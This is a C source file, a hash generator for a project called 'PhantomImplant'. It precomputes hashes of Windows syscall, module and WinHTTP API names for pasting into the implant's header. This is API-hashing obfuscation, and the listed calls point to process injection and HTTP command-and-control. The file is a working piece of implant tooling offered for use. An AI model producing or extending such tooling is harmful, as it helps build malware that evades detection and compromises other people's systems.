/**
 * PhantomImplant - Hash Generator Utility
 *
 * Standalone tool to precompute API and module name hashes.
 * Run this on your dev machine, then paste the hash values
 * into common.h as #define constants.
 *
 * Compile: cl.exe hashgen.c /Fe:hashgen.exe
 * Or:      x86_64-w64-mingw32-gcc hashgen.c -o hashgen.exe
 */

#include <stdio.h>
#include <string.h>
#include <ctype.h>

#define INITIAL_SEED 7

unsigned int HashStringJenkinsOneAtATime32BitA(const char* String) {
    unsigned int Index = 0;
    unsigned int Hash  = INITIAL_SEED;

    while (String[Index] != 0) {
        Hash += String[Index++];
        Hash += Hash << 10;
        Hash ^= Hash >> 6;
    }

    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;

    return Hash;
}

int main() {
    // Syscall names (these become the #define values in common.h)
    const char* syscalls[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtWaitForSingleObject",
        "NtWriteVirtualMemory",
        "NtOpenProcess",
        "NtClose",
        "NtQuerySystemInformation",
        "NtCreateSection",
        "NtMapViewOfSection",
        "NtUnmapViewOfSection",
        "NtQueueApcThread",
        "NtResumeThread",
        "NtDelayExecution",
        NULL
    };

    // Module names (UPPERCASE - must match GetModuleHandleH convention)
    const char* modules[] = {
        "NTDLL.DLL",
        "KERNEL32.DLL",
        "KERNELBASE.DLL",
        "USER32.DLL",
        "ADVAPI32.DLL",
        "WINHTTP.DLL",
        NULL
    };

    printf("// =============================================\n");
    printf("// Syscall hashes (paste into common.h)\n");
    printf("// Seed: %d\n", INITIAL_SEED);
    printf("// =============================================\n\n");

    for (int i = 0; syscalls[i] != NULL; i++) {
        // Left-pad name for alignment
        printf("#define %-40s 0x%08X\n",
            syscalls[i],
            HashStringJenkinsOneAtATime32BitA(syscalls[i]));
    }

    // Generate _HASH suffixed versions
    printf("\n// With _HASH suffix:\n");
    for (int i = 0; syscalls[i] != NULL; i++) {
        char buf[128];
        snprintf(buf, sizeof(buf), "%s_HASH", syscalls[i]);
        printf("#define %-40s 0x%08X\n",
            buf,
            HashStringJenkinsOneAtATime32BitA(syscalls[i]));
    }

    printf("\n// =============================================\n");
    printf("// Module hashes (paste into common.h)\n");
    printf("// =============================================\n\n");

    for (int i = 0; modules[i] != NULL; i++) {
        char buf[128];
        // Remove the dot for the define name
        snprintf(buf, sizeof(buf), "%s_HASH", modules[i]);
        // Replace . with _ in define name
        for (char* p = buf; *p; p++) {
            if (*p == '.') *p = '_';
        }
        printf("#define %-40s 0x%08X\n",
            buf,
            HashStringJenkinsOneAtATime32BitA(modules[i]));
    }

    printf("\n// =============================================\n");
    printf("// WinAPI function hashes\n");
    printf("// =============================================\n\n");

    const char* winapis[] = {
        "LoadLibraryA", "LoadLibraryW",
        "VirtualAlloc", "VirtualProtect", "VirtualFree",
        "CreateThread", "WaitForSingleObject",
        "GetProcAddress", "GetModuleHandleA", "GetModuleHandleW",
        "WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest",
        "WinHttpSendRequest", "WinHttpReceiveResponse",
        "WinHttpReadData", "WinHttpCloseHandle",
        "RtlMoveMemory", "RtlZeroMemory",
        NULL
    };

    for (int i = 0; winapis[i] != NULL; i++) {
        char buf[128];
        snprintf(buf, sizeof(buf), "%s_HASH", winapis[i]);
        printf("#define %-40s 0x%08X\n",
            buf,
            HashStringJenkinsOneAtATime32BitA(winapis[i]));
    }

    return 0;
}
